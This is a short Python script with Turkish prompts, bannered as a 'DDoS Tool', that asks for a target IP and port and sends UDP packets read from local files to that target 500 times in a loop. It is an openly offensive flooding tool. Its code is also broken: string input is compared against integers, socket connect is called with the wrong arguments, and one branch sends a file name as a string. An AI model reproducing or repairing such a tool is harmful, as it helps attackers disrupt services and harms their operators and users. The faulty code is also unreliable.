import socket
import string
from pyfiglet import Figlet
import time

f = Figlet(font="standard")
soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f.renderText("Komutan Logar"))
print(f.renderText("DDoS Tool"))
ip = input("Paket Gönderilecek IP'yi giriniz.")
port = input("Paket Gönderilecek Port'u giriniz.")
paketbuyukluk = input("Gönderilecek paketlerin büyüklüğünü giriniz. (1, 2, 3)")

if paketbuyukluk == 1:
    soket.connect(ip, port)
    for paket in range(1, 500 + 1):
        try:
            a = open("a.txt")
            soket.send(open("a.txt", "rb").read())
            print("Paket gönderildi!", paket)
        except:
            print("Paket gönderilemedi!", paket)
elif paketbuyukluk == 2:
    soket.connect(ip, port)
    for paket in range(1, 500 + 1):
        try:
            a2 = open("a2.txt")
            soket.send(open("a2.txt", "rb").read())
            print("Paket gönderildi!", paket)
        except:
            print("Paket gönderilemedi!", paket)
elif paketbuyukluk == 3:
    soket.connect(ip, port)
    for paket in range(1, 500 + 1):
        try:
            a3 = open("a3.txt")
            soket.send("a3.txt")
            print("Paket gönderildi!", paket)
        except:
            print("Paket gönderilemedi!", paket)
else:
    print("Hata! Lütfen programı tekrar açın.")   
    time.sleep(1)
    quit()         
